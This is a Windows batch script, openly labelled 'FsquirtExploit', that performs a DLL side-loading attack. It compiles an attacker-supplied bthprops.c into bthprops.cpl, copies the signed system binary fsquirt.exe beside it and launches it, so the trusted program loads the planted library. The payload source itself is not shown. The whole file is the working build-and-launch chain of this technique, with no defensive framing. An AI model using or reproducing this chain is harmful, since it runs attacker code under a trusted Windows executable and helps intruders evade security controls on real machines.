@echo off
setlocal

set "WORK_DIR=C:\Temp\FsquirtExploit"
set "CPL_NAME=bthprops.cpl"
set "FSQUIRT_EXE=C:\Windows\System32\fsquirt.exe"

:: Create work directory
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"

:: Setup Visual Studio environment and compile
call "C:\Program Files\Microsoft Visual Studio\18\Professional\VC\Auxiliary\Build\vcvarsall.bat" x64
cl.exe /nologo /LD "%WORK_DIR%\bthprops.c" /link /DEF:"%WORK_DIR%\bthprops.def" /OUT:"%WORK_DIR%\%CPL_NAME%" /SUBSYSTEM:WINDOWS kernel32.lib user32.lib

:: Copy fsquirt.exe to work directory and run
copy "%FSQUIRT_EXE%" "%WORK_DIR%\fsquirt.exe"
"%WORK_DIR%\fsquirt.exe"

